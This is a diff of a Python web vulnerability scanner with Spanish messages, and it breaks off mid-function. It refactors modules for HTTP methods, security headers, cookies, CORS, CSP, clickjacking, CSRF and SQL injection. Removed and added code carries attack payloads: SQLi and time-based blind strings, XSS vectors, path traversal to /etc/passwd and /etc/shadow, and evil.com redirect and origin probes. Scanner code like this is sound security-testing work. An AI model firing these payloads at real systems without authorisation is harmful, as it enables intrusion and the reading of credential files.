+    session = ctx["session"]
+    methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE","CONNECT",
+               "PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK","UNLOCK"]
     allowed = []
     dangerous = []
 
     for method in methods:
-        resp = safe_request(session, method, base_url, rate_limiter, timeout=5)
-        if resp and resp.status_code not in (405, 501):
-            allowed.append({"method": method, "status": resp.status_code})
-            log_ok(f"{method} -> [{resp.status_code}]")
-
-            if method == "TRACE" and resp.status_code == 200:
+        ctx["rate_limiter"].wait()
+        r = safe_request(session, method, url, rotate_ua=ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code not in (405, 501, 400):
+            allowed.append({"method": method, "status": r.status_code})
+            if method in ("TRACE","PUT","DELETE","CONNECT","MOVE","COPY"):
+                log_vuln("MEDIUM", f"Metodo peligroso habilitado: {method} [{r.status_code}]")
                 dangerous.append(method)
-                log_vuln("MEDIUM", "TRACE habilitado (Cross-Site Tracing)")
-            if method in ("PUT", "DELETE") and resp.status_code in (200, 201, 204):
-                dangerous.append(method)
-                log_vuln("HIGH", f"{method} habilitado (modificacion de recursos)")
+            else:
+                log_ok(f"{method} [{r.status_code}]")
 
-    # Check OPTIONS for allowed methods
-    resp = safe_request(session, "OPTIONS", base_url, rate_limiter)
-    if resp:
-        allow_header = resp.headers.get("Allow", "")
-        if allow_header:
-            log_info(f"Allow header: {allow_header}")
+    # Check OPTIONS header
+    r = safe_request(session, "OPTIONS", url, ctx["rate_limiter"])
+    if r and "Allow" in r.headers:
+        log_info(f"Allow header: {r.headers['Allow']}")
 
-    # Method override
-    override_headers = [
-        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
+    ctx["results"]["http_methods"] = {"allowed": allowed, "dangerous": dangerous}
+
+
+# =====================================================================
+#  MODULE 18: SECURITY HEADERS AUDIT
+# =====================================================================
+def mod_security_headers(ctx):
+    section_header("SECURITY HEADERS AUDIT")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
+        log_fail("No response.")
+        return
+
+    headers = {k.lower(): v for k, v in r.headers.items()}
+    findings = []
+
+    checks = [
+        ("strict-transport-security", "HSTS", "HIGH",
+         "Falta Strict-Transport-Security - vulnerable a downgrade attacks"),
+        ("x-content-type-options", "X-Content-Type-Options", "LOW",
+         "Falta X-Content-Type-Options - MIME sniffing posible"),
+        ("x-frame-options", "X-Frame-Options", "MEDIUM",
+         "Falta X-Frame-Options - vulnerable a clickjacking"),
+        ("x-xss-protection", "X-XSS-Protection", "LOW",
+         "Falta X-XSS-Protection header"),
+        ("content-security-policy", "CSP", "MEDIUM",
+         "Falta Content-Security-Policy - XSS risk"),
+        ("referrer-policy", "Referrer-Policy", "LOW",
+         "Falta Referrer-Policy - information leakage"),
+        ("permissions-policy", "Permissions-Policy", "LOW",
+         "Falta Permissions-Policy"),
+        ("x-permitted-cross-domain-policies", "X-Permitted-Cross-Domain-Policies", "LOW",
+         "Falta X-Permitted-Cross-Domain-Policies"),
+        ("cross-origin-opener-policy", "COOP", "LOW",
+         "Falta Cross-Origin-Opener-Policy"),
+        ("cross-origin-resource-policy", "CORP", "LOW",
+         "Falta Cross-Origin-Resource-Policy"),
+        ("cross-origin-embedder-policy", "COEP", "LOW",
+         "Falta Cross-Origin-Embedder-Policy"),
     ]
-    for oh in override_headers:
-        resp = safe_request(session, "POST", base_url, rate_limiter,
-                           headers={oh: "DELETE"}, timeout=5)
-        if resp and resp.status_code in (200, 204):
-            log_vuln("MEDIUM", f"Method override via {oh}")
-            dangerous.append(f"Override: {oh}")
 
-    results["http_methods"] = {"allowed": allowed, "dangerous": dangerous}
+    for header, name, severity, msg in checks:
+        if header in headers:
+            log_ok(f"{name}: {headers[header]}")
+            findings.append({"header": name, "present": True, "value": headers[header]})
+            # Check weak values
+            if header == "strict-transport-security":
+                if "max-age=0" in headers[header]:
+                    log_vuln("HIGH", "HSTS max-age=0 (deshabilitado)")
+            if header == "content-security-policy":
+                csp = headers[header].lower()
+                if "unsafe-inline" in csp:
+                    log_vuln("MEDIUM", "CSP permite unsafe-inline")
+                if "unsafe-eval" in csp:
+                    log_vuln("MEDIUM", "CSP permite unsafe-eval")
+                if "*" in csp.split():
+                    log_vuln("MEDIUM", "CSP usa wildcard *")
+        else:
+            log_vuln(severity, msg)
+            findings.append({"header": name, "present": False, "severity": severity})
+
+    # Info disclosure headers
+    info_headers = ["server", "x-powered-by", "x-aspnet-version", "x-runtime",
+                    "x-generator", "x-drupal-cache", "x-debug"]
+    for h in info_headers:
+        if h in headers:
+            log_vuln("LOW", f"Info disclosure: {h}: {headers[h]}")
+            findings.append({"header": h, "present": True, "value": headers[h], "type": "info_disclosure"})
+
+    ctx["results"]["security_headers"] = findings
 
 
 # =====================================================================
-#  MODULE 14: CORS TESTING
+#  MODULE 19: COOKIE SECURITY
 # =====================================================================
-def mod_cors_test(session, base_url, rate_limiter, results):
-    """Test activo de CORS."""
+def mod_cookie_security(ctx):
+    section_header("COOKIE SECURITY ANALYSIS")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
+        log_fail("No response.")
+        return
+
+    findings = []
+    set_cookie_headers = r.headers.get("Set-Cookie", "")
+    if not set_cookie_headers and not r.cookies:
+        log_info("No se encontraron cookies.")
+        return
+
+    # Parse Set-Cookie headers
+    raw_cookies = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, "getlist") else [set_cookie_headers]
+
+    for cookie_str in raw_cookies:
+        if not cookie_str:
+            continue
+        parts = cookie_str.split(";")
+        name = parts[0].split("=")[0].strip() if "=" in parts[0] else parts[0].strip()
+        flags_str = cookie_str.lower()
+        issues = []
+
+        if "secure" not in flags_str:
+            issues.append("Falta flag Secure")
+        if "httponly" not in flags_str:
+            issues.append("Falta flag HttpOnly")
+        if "samesite" not in flags_str:
+            issues.append("Falta flag SameSite")
+        elif "samesite=none" in flags_str:
+            issues.append("SameSite=None (cross-site)")
+
+        finding = {"name": name, "flags": flags_str, "issues": issues}
+        findings.append(finding)
+
+        if issues:
+            for issue in issues:
+                sev = "MEDIUM" if "Secure" in issue or "HttpOnly" in issue else "LOW"
+                log_vuln(sev, f"Cookie '{name}': {issue}")
+        else:
+            log_ok(f"Cookie '{name}': Bien configurada")
+
+    ctx["results"]["cookies"] = findings
+
+
+# =====================================================================
+#  MODULE 20: CORS TESTING
+# =====================================================================
+def mod_cors_test(ctx):
     section_header("CORS TESTING")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
 
-    cors_issues = []
-    domain = get_domain(base_url)
-
-    tests = [
-        ("https://evil.com", "Arbitrary origin"),
-        (f"https://{domain}.evil.com", "Subdomain prefix"),
-        (f"https://evil{domain}", "Domain suffix"),
-        ("null", "Null origin"),
-        (f"https://{domain}", "Same origin (baseline)"),
-        (f"http://{domain}", "HTTP downgrade"),
+    origins = [
+        "https://evil.com",
+        "https://attacker.com",
+        f"https://{ctx['domain']}.evil.com",
+        f"https://evil{ctx['domain']}",
+        "null",
+        f"https://{ctx['domain']}",
+        "https://localhost",
+        "http://localhost",
     ]
 
-    for origin, desc in tests:
-        resp = safe_request(session, "GET", base_url, rate_limiter,
-                           headers={"Origin": origin})
-        if resp is None:
+    for origin in origins:
+        ctx["rate_limiter"].wait()
+        r = safe_request(session, "GET", url, headers={"Origin": origin},
+                         rotate_ua=ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "")
+
+        if acao:
+            finding = {"origin": origin, "acao": acao, "acac": acac}
+            if acao == "*":
+                log_vuln("MEDIUM", f"CORS: wildcard * (Origin: {origin})")
+                finding["severity"] = "MEDIUM"
+            elif acao == origin and origin not in (f"https://{ctx['domain']}", ""):
+                log_vuln("HIGH", f"CORS refleja origin arbitrario: {origin}")
+                finding["severity"] = "HIGH"
+                if acac.lower() == "true":
+                    log_vuln("CRITICAL", f"CORS: origin reflejado + credentials! (Origin: {origin})")
+                    finding["severity"] = "CRITICAL"
+            elif acao == "null":
+                log_vuln("HIGH", "CORS: acepta origin null")
+                finding["severity"] = "HIGH"
+            findings.append(finding)
+
+    ctx["results"]["cors"] = findings
+
+
+# =====================================================================
+#  MODULE 21: CSP ANALYSIS
+# =====================================================================
+def mod_csp_analysis(ctx):
+    section_header("CSP ANALYSIS")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
+        return
+
+    csp = r.headers.get("Content-Security-Policy", "")
+    csp_ro = r.headers.get("Content-Security-Policy-Report-Only", "")
+    findings = []
+
+    if not csp and not csp_ro:
+        log_vuln("MEDIUM", "No se encontro Content-Security-Policy")
+        ctx["results"]["csp"] = [{"issue": "No CSP header"}]
+        return
+
+    policy = csp or csp_ro
+    if csp_ro and not csp:
+        log_warn("Solo existe CSP en modo Report-Only (no enforcing)")
+        findings.append({"issue": "Report-Only mode"})
+
+    directives = {}
+    for part in policy.split(";"):
+        part = part.strip()
+        if part:
+            tokens = part.split()
+            if tokens:
+                directives[tokens[0]] = tokens[1:] if len(tokens) > 1 else []
+
+    log_info(f"Directivas encontradas: {len(directives)}")
+
+    # Check for dangerous values
+    dangerous = {
+        "unsafe-inline": "Permite inline scripts/styles - XSS posible",
+        "unsafe-eval": "Permite eval() - code injection posible",
+        "data:": "Permite data: URIs - bypass CSP",
+        "blob:": "Permite blob: URIs - bypass posible",
+        "*": "Wildcard - permite cualquier source",
+    }
+    for directive, values in directives.items():
+        for val in values:
+            if val.strip("'") in dangerous or val in dangerous:
+                msg = dangerous.get(val.strip("'"), dangerous.get(val, ""))
+                log_vuln("MEDIUM", f"CSP {directive}: {val} - {msg}")
+                findings.append({"directive": directive, "value": val, "issue": msg})
+
+    # Missing important directives
+    important = ["default-src", "script-src", "style-src", "img-src", "frame-ancestors", "base-uri", "form-action"]
+    for d in important:
+        if d not in directives:
+            log_warn(f"Falta directiva: {d}")
+            findings.append({"directive": d, "issue": "missing"})
+
+    ctx["results"]["csp"] = findings
+
+
+# =====================================================================
+#  MODULE 22: CLICKJACKING TEST
+# =====================================================================
+def mod_clickjacking(ctx):
+    section_header("CLICKJACKING TEST")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
+        return
+
+    xfo = r.headers.get("X-Frame-Options", "")
+    csp = r.headers.get("Content-Security-Policy", "")
+    findings = []
+
+    if xfo:
+        log_ok(f"X-Frame-Options: {xfo}")
+        if xfo.upper() not in ("DENY", "SAMEORIGIN"):
+            log_vuln("MEDIUM", f"X-Frame-Options valor debil: {xfo}")
+            findings.append({"issue": f"Weak XFO: {xfo}"})
+    else:
+        log_vuln("MEDIUM", "Falta X-Frame-Options")
+        findings.append({"issue": "Missing X-Frame-Options"})
+
+    if "frame-ancestors" in csp:
+        log_ok("CSP frame-ancestors presente")
+    elif not xfo:
+        log_vuln("MEDIUM", "Sin proteccion contra clickjacking (ni XFO ni frame-ancestors)")
+        findings.append({"issue": "No clickjacking protection"})
+
+    ctx["results"]["clickjacking"] = findings
+
+
+# =====================================================================
+#  MODULE 23: CSRF DETECTION
+# =====================================================================
+def mod_csrf_detection(ctx):
+    section_header("CSRF DETECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    forms = ctx.get("_crawled_forms", [])
+    findings = []
+
+    if not forms:
+        # Try to find forms on main page
+        r = safe_request(session, "GET", url, ctx["rate_limiter"])
+        if r:
+            parser = LinkParser()
+            try:
+                parser.feed(r.text)
+            except Exception:
+                pass
+            forms = parser.forms
+
+    if not forms:
+        log_info("No se encontraron formularios para analizar.")
+        return
+
+    csrf_tokens = ["csrf", "token", "_token", "csrf_token", "csrfmiddlewaretoken",
+                   "authenticity_token", "__requestverificationtoken", "antiforgery",
+                   "xsrf", "_csrf", "nonce"]
+
+    for form in forms:
+        action = form.get("action", "")
+        method = form.get("method", "GET").upper()
+        inputs = form.get("inputs", [])
+
+        if method != "POST":
             continue
 
-        acao = resp.headers.get("Access-Control-Allow-Origin", "")
-        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
-
-        if acao and acao != f"https://{domain}":
-            issue = {
-                "origin_sent": origin,
-                "acao": acao,
-                "acac": acac,
-                "description": desc,
-            }
-
-            if acao == "*":
-                if acac.lower() == "true":
-                    log_vuln("CRITICAL", f"CORS: Wildcard + Credentials (Origin: {origin})")
-                else:
-                    log_vuln("MEDIUM", f"CORS: Wildcard origin (Origin: {origin})")
-                cors_issues.append(issue)
-            elif acao == origin and origin not in (f"https://{domain}", f"http://{domain}"):
-                if acac.lower() == "true":
-                    log_vuln("HIGH", f"CORS: Origin reflejado + Credentials ({desc})")
-                else:
-                    log_vuln("MEDIUM", f"CORS: Origin reflejado ({desc})")
-                cors_issues.append(issue)
-            elif acao == "null":
-                log_vuln("HIGH", "CORS: null origin permitido")
-                cors_issues.append(issue)
-
-    if not cors_issues:
-        log_ok("CORS configurado correctamente.")
-
-    results["cors_active"] = cors_issues
-
-
-# =====================================================================
-#  MODULE 15: SQL INJECTION PROBE
-# =====================================================================
-def mod_sqli_probe(session, base_url, crawl_results, rate_limiter, results):
-    """Deteccion de SQL injection."""
-    section_header("SQL INJECTION PROBE")
-
-    sqli_findings = []
-    sql_errors = [
-        r"you have an error in your sql",
-        r"warning.*mysql",
-        r"unclosed quotation mark",
-        r"quoted string not properly terminated",
-        r"microsoft ole db provider for sql server",
-        r"microsoft sql native client error",
-        r"ora-\d{5}",
-        r"pg_query\(\).*failed",
-        r"pg_exec\(\).*failed",
-        r"postgresql.*error",
-        r"valid postgresql result",
-        r"sqlite.*error",
-        r"sqlite3\.",
-        r"jdbc\..*exception",
-        r"sql syntax.*mysql",
-        r"syntax error.*sql",
-        r"unexpected end of sql",
-        r"sql command not properly ended",
-        r"odbc.*driver.*error",
-        r"db2.*sql.*error",
-    ]
-    sql_pattern = re.compile("|".join(sql_errors), re.I)
-
-    # Collect testable URLs from crawl
-    test_urls = set()
-    if crawl_results:
-        for url in crawl_results.get("visited_urls", []):
-            if "?" in url:
-                test_urls.add(url)
-        for form in crawl_results.get("forms", []):
-            test_urls.add(form.get("action", base_url))
-
-    if not test_urls:
-        test_urls.add(base_url)
-        log_info("No se encontraron URLs con parametros. Probando base URL.")
-
-    payloads = ["'", '"', "' OR '1'='1", "1 OR 1=1", "' OR ''='", "1' ORDER BY 1--",
-                "1 UNION SELECT NULL--", "') OR ('1'='1"]
-
-    log_info(f"Probando {len(test_urls)} URLs con {len(payloads)} payloads...")
-
-    for url in test_urls:
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-
-        if not params:
-            # Test common params
-            for common_param in ["id", "page", "search", "q", "user", "cat"]:
-                for payload in payloads:
-                    test_url = f"{url}?{common_param}={quote(payload)}"
-                    resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                    if resp and sql_pattern.search(resp.text):
-                        finding = {
-                            "url": url,
-                            "param": common_param,
-                            "payload": payload,
-                            "type": "Error-based SQLi",
-                            "evidence": sql_pattern.search(resp.text).group(0)[:80],
-                        }
-                        sqli_findings.append(finding)
-                        log_vuln("CRITICAL", f"SQLi en {common_param}: {payload}")
-                        break
-        else:
-            for param_name in params:
-                for payload in payloads:
-                    test_params = params.copy()
-                    test_params[param_name] = [payload]
-                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-                    resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                    if resp and sql_pattern.search(resp.text):
-                        finding = {
-                            "url": url,
-                            "param": param_name,
-                            "payload": payload,
-                            "type": "Error-based SQLi",
-                            "evidence": sql_pattern.search(resp.text).group(0)[:80],
-                        }
-                        sqli_findings.append(finding)
-                        log_vuln("CRITICAL", f"SQLi en {param_name}: {payload}")
-                        break
-
-                # Boolean-based blind test
-                true_resp = safe_request(session, "GET",
-                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param_name}=1 AND 1=1",
-                    rate_limiter, allow_redirects=True)
-                false_resp = safe_request(session, "GET",
-                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param_name}=1 AND 1=2",
-                    rate_limiter, allow_redirects=True)
-                if true_resp and false_resp:
-                    if len(true_resp.content) != len(false_resp.content) and abs(len(true_resp.content) - len(false_resp.content)) > 50:
-                        finding = {
-                            "url": url,
-                            "param": param_name,
-                            "payload": "1 AND 1=1 vs 1 AND 1=2",
-                            "type": "Boolean-based Blind SQLi",
-                            "evidence": f"Size diff: {abs(len(true_resp.content) - len(false_resp.content))} bytes",
-                        }
-                        sqli_findings.append(finding)
-                        log_vuln("HIGH", f"Blind SQLi posible en {param_name} (size diff: {abs(len(true_resp.content) - len(false_resp.content))} bytes)")
-
-    if not sqli_findings:
-        log_ok("No se detecto SQL injection.")
-
-    results["sqli"] = sqli_findings
-
-
-# =====================================================================
-#  MODULE 16: XSS PROBE
-# =====================================================================
-def mod_xss_probe(session, base_url, crawl_results, rate_limiter, results):
-    """Deteccion de Cross-Site Scripting (XSS) reflejado."""
-    section_header("XSS PROBE")
-
-    xss_findings = []
-    canary = "xss_probe_" + hashlib.md5(base_url.encode()).hexdigest()[:8]
-
-    payloads = [
-        (f"<script>{canary}</script>", "script tag"),
-        (f'"><img src=x onerror={canary}>', "img onerror"),
-        (f"'><svg/onload={canary}>", "svg onload"),
-        (f"javascript:{canary}", "javascript URI"),
-        (f"<{canary}>", "custom tag"),
-        (f'"{canary}', "quote break"),
-    ]
-
-    # Collect testable URLs
-    test_urls = set()
-    if crawl_results:
-        for url in crawl_results.get("visited_urls", []):
-            if "?" in url:
-                test_urls.add(url)
-
-    if not test_urls:
-        test_urls.add(base_url)
-
-    log_info(f"Probando {len(test_urls)} URLs...")
-
-    for url in test_urls:
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-
-        if not params:
-            params = {"q": ["test"], "search": ["test"], "s": ["test"]}
-            for param_name in params:
-                for payload, ptype in payloads:
-                    test_url = f"{url}?{param_name}={quote(payload)}"
-                    resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                    if resp and canary in resp.text:
-                        # Check if payload is reflected unencoded
-                        if payload in resp.text or payload.replace('"', '&quot;') not in resp.text:
-                            finding = {
-                                "url": url,
-                                "param": param_name,
-                                "payload": payload,
-                                "type": f"Reflected XSS ({ptype})",
-                            }
-                            xss_findings.append(finding)
-                            log_vuln("HIGH", f"XSS reflejado en {param_name} ({ptype})")
-                            break
-        else:
-            for param_name in params:
-                # First check if value is reflected
-                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param_name}={canary}"
-                resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                if resp and canary in resp.text:
-                    log_info(f"  Param {param_name} refleja input, probando payloads...")
-                    for payload, ptype in payloads:
-                        test_params = params.copy()
-                        test_params[param_name] = [payload]
-                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-                        resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                        if resp and payload in resp.text:
-                            finding = {
-                                "url": url,
-                                "param": param_name,
-                                "payload": payload,
-                                "type": f"Reflected XSS ({ptype})",
-                            }
-                            xss_findings.append(finding)
-                            log_vuln("HIGH", f"XSS reflejado en {param_name} ({ptype})")
-                            break
-
-    # Test forms
-    if crawl_results:
-        for form in crawl_results.get("forms", [])[:10]:
-            for inp in form.get("inputs", []):
-                if inp.get("type") in ("hidden", "submit", "button"):
-                    continue
-                for payload, ptype in payloads[:3]:
-                    data = {}
-                    for i in form.get("inputs", []):
-                        data[i["name"]] = i.get("value", "test")
-                    data[inp["name"]] = payload
-
-                    method = form.get("method", "GET")
-                    action = form.get("action", base_url)
-                    if method == "POST":
-                        resp = safe_request(session, "POST", action, rate_limiter, data=data, allow_redirects=True)
-                    else:
-                        resp = safe_request(session, "GET", f"{action}?{urlencode(data)}", rate_limiter, allow_redirects=True)
-
-                    if resp and payload in resp.text:
-                        finding = {
-                            "url": action,
-                            "param": inp["name"],
-                            "payload": payload,
-                            "type": f"Reflected XSS in form ({ptype})",
-                        }
-                        xss_findings.append(finding)
-                        log_vuln("HIGH", f"XSS en form input {inp['name']} ({ptype})")
-                        break
-
-    if not xss_findings:
-        log_ok("No se detecto XSS reflejado.")
-
-    results["xss"] = xss_findings
-
-
-# =====================================================================
-#  MODULE 17: LFI PROBE
-# =====================================================================
-def mod_lfi_probe(session, base_url, crawl_results, rate_limiter, results):
-    """Deteccion de Local File Inclusion."""
-    section_header("LFI PROBE")
-
-    lfi_findings = []
-    lfi_payloads = [
-        ("../../../etc/passwd", "root:"),
-        ("....//....//....//etc/passwd", "root:"),
-        ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
-        ("..\\..\\..\\etc\\passwd", "root:"),
-        ("/etc/passwd", "root:"),
-        ("../../../windows/win.ini", "[fonts]"),
-        ("....//....//windows/win.ini", "[fonts]"),
-        ("../../../etc/shadow", "root:"),
-        ("../../../etc/hosts", "localhost"),
-        ("php://filter/convert.base64-encode/resource=index", "PD"),
-        ("php://filter/read=string.rot13/resource=index", ""),
-        ("/proc/self/environ", "SERVER_"),
-    ]
-
-    # Collect file-inclusion-prone params
-    file_params = ["file", "path", "page", "include", "dir", "document", "folder",
-                   "root", "pg", "style", "template", "php_path", "doc", "view",
-                   "content", "layout", "mod", "conf", "load", "read", "fetch"]
-
-    test_urls = set()
-    if crawl_results:
-        for url in crawl_results.get("visited_urls", []):
-            if "?" in url:
-                test_urls.add(url)
-
-    if not test_urls:
-        test_urls.add(base_url)
-
-    log_info(f"Probando {len(test_urls)} URLs con {len(lfi_payloads)} payloads...")
-
-    for url in test_urls:
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-
-        target_params = {}
-        if params:
-            for p in params:
-                if p.lower() in file_params:
-                    target_params[p] = params[p]
-            if not target_params:
-                target_params = params
-        else:
-            target_params = {p: ["test"] for p in file_params[:5]}
-
-        for param_name in target_params:
-            for payload, indicator in lfi_payloads:
-                if not indicator:
-                    continue
-                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param_name}={quote(payload)}"
-                resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-                if resp and indicator in resp.text:
-                    finding = {
-                        "url": url,
-                        "param": param_name,
-                        "payload": payload,
-                        "type": "Local File Inclusion",
-                        "indicator": indicator,
-                    }
-                    lfi_findings.append(finding)
-                    log_vuln("CRITICAL", f"LFI en {param_name}: {payload}")
-                    break
-
-    if not lfi_findings:
-        log_ok("No se detecto LFI.")
-
-    results["lfi"] = lfi_findings
-
-
-# =====================================================================
-#  MODULE 18: OPEN REDIRECT PROBE
-# =====================================================================
-def mod_redirect_probe(session, base_url, crawl_results, rate_limiter, results):
-    """Deteccion de Open Redirect."""
-    section_header("OPEN REDIRECT PROBE")
-
-    redirect_findings = []
-    redirect_params = ["url", "redirect", "redir", "return", "next", "goto", "target",
-                       "dest", "destination", "rurl", "return_url", "redirect_url",
-                       "continue", "callback", "forward", "out", "view", "login_url",
-                       "redirect_to", "return_to", "checkout_url", "image_url"]
-
-    evil_urls = [
-        "https://evil.com",
-        "//evil.com",
-        "https:evil.com",
-        "/\\evil.com",
-        "////evil.com",
-        "https://evil.com%23.target.com",
-        "https://evil.com%2f%2f",
-    ]
-
-    test_urls = set()
-    if crawl_results:
-        for url in crawl_results.get("visited_urls", []):
-            if "?" in url:
-                parsed = urlparse(url)
-                params = parse_qs(parsed.query)
-                for p in params:
-                    if p.lower() in redirect_params:
-                        test_urls.add(url)
-
-    log_info(f"Probando {len(redirect_params)} params con {len(evil_urls)} payloads...")
-
-    # Test common redirect params on base URL
-    for param in redirect_params:
-        for evil in evil_urls:
-            test_url = f"{base_url}?{param}={quote(evil)}"
-            resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=False)
-            if resp and resp.status_code in (301, 302, 303, 307, 308):
-                location = resp.headers.get("Location", "")
-                if "evil.com" in location:
-                    finding = {
-                        "url": base_url,
-                        "param": param,
-                        "payload": evil,
-                        "redirect_to": location,
-                    }
-                    redirect_findings.append(finding)
-                    log_vuln("MEDIUM", f"Open Redirect en {param} -> {location}")
-                    break
-
-    # Test crawled URLs with redirect params
-    for url in test_urls:
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        for param_name in params:
-            if param_name.lower() in redirect_params:
-                for evil in evil_urls[:3]:
-                    test_params = params.copy()
-                    test_params[param_name] = [evil]
-                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-                    resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=False)
-                    if resp and resp.status_code in (301, 302, 303, 307, 308):
-                        location = resp.headers.get("Location", "")
-                        if "evil.com" in location:
-                            finding = {
-                                "url": url,
-                                "param": param_name,
-                                "payload": evil,
-                                "redirect_to": location,
-                            }
-                            redirect_findings.append(finding)
-                            log_vuln("MEDIUM", f"Open Redirect en {param_name} -> {location}")
-                            break
-
-    if not redirect_findings:
-        log_ok("No se detecto Open Redirect.")
-
-    results["open_redirect"] = redirect_findings
-
-
-# =====================================================================
-#  MODULE 19: CRLF INJECTION PROBE
-# =====================================================================
-def mod_crlf_probe(session, base_url, rate_limiter, results):
-    """Deteccion de CRLF injection."""
-    section_header("CRLF INJECTION PROBE")
-
-    crlf_findings = []
-    canary = "X-CRLF-Test: injected"
-
-    payloads = [
-        f"%0d%0a{canary}",
-        f"%0D%0A{canary}",
-        f"%E5%98%8A%E5%98%8D{canary}",
-        f"\\r\\n{canary}",
-        f"%0d%0a%0d%0a<script>alert(1)</script>",
-    ]
-
-    for payload in payloads:
-        test_url = f"{base_url}/{payload}"
-        resp = safe_request(session, "GET", test_url, rate_limiter)
-        if resp:
-            # Check if our header was injected
-            if "x-crlf-test" in str(resp.headers).lower():
-                finding = {
-                    "url": base_url,
-                    "payload": payload[:50],
-                    "type": "CRLF Header Injection",
-                }
-                crlf_findings.append(finding)
-                log_vuln("HIGH", f"CRLF injection en path: {payload[:50]}")
-
-            # Check response body for injected content
-            if "<script>alert(1)</script>" in resp.text and "alert" in payload:
-                finding = {
-                    "url": base_url,
-                    "payload": payload[:50],
-                    "type": "CRLF + XSS (Response Splitting)",
-                }
-                crlf_findings.append(finding)
-                log_vuln("CRITICAL", "CRLF + XSS via response splitting")
-
-    # Test in params
-    for param in ["url", "redirect", "page", "path"]:
-        for payload in payloads[:3]:
-            test_url = f"{base_url}?{param}={payload}"
-            resp = safe_request(session, "GET", test_url, rate_limiter)
-            if resp and "x-crlf-test" in str(resp.headers).lower():
-                crlf_findings.append({
-                    "url": base_url,
-                    "param": param,
-                    "payload": payload[:50],
-                    "type": "CRLF Header Injection in param",
-                })
-                log_vuln("HIGH", f"CRLF injection en param {param}")
+        has_csrf = False
+        for inp in inputs:
+            if any(t in inp.lower() for t in csrf_tokens):
+                has_csrf = True
                 break
 
-    if not crlf_findings:
-        log_ok("No se detecto CRLF injection.")
+        if not has_csrf:
+            log_vuln("MEDIUM", f"Formulario sin token CSRF: action={action}, method={method}")
+            findings.append({"action": action, "method": method, "issue": "No CSRF token"})
+        else:
+            log_ok(f"Formulario con CSRF token: action={action}")
 
-    results["crlf"] = crlf_findings
+    ctx["results"]["csrf"] = findings
 
 
 # =====================================================================
-#  MODULE 20: HOST HEADER INJECTION
+#  MODULE 24: SQL INJECTION (ENHANCED)
 # =====================================================================
-def mod_header_inject(session, base_url, rate_limiter, results):
-    """Test de Host header injection."""
+def mod_sqli(ctx):
+    section_header("SQL INJECTION PROBE (Enhanced)")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Get parameters from URL and crawler
+    params = list(ctx.get("_crawled_params", set()))
+    parsed = urlparse(url)
+    if parsed.query:
+        for k in parse_qs(parsed.query):
+            if k not in params:
+                params.append(k)
+    if not params:
+        params = ["id", "page", "search", "q", "user", "cat", "item", "product", "order"]
+
+    log_info(f"Probando {len(params)} parametros con {len(SQLI_PAYLOADS)} payloads...")
+    base = url.split("?")[0]
+
+    for param in params:
+        # Error-based SQLi
+        for payload in SQLI_PAYLOADS:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            body = r.text.lower()
+            for error in SQLI_ERRORS:
+                if error in body:
+                    log_vuln("CRITICAL", f"SQLi (error-based): param={param} payload={payload[:40]}")
+                    log_info(f"  Error: {error}")
+                    findings.append({"param": param, "type": "error-based", "payload": payload,
+                                   "error": error, "severity": "CRITICAL"})
+                    break
+
+        # Boolean-based blind SQLi
+        r_true = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='1",
+                            ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        r_false = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='2",
+                             ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r_true and r_false:
+            if r_true.status_code == r_false.status_code and abs(len(r_true.content) - len(r_false.content)) > 50:
+                log_vuln("HIGH", f"SQLi (blind boolean): param={param} - respuestas diferentes")
+                findings.append({"param": param, "type": "blind-boolean", "severity": "HIGH"})
+
+        # Time-based blind SQLi
+        for sleep_payload in ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"]:
+            start = time.time()
+            r = safe_request(session, "GET", f"{base}?{param}={quote(sleep_payload)}",
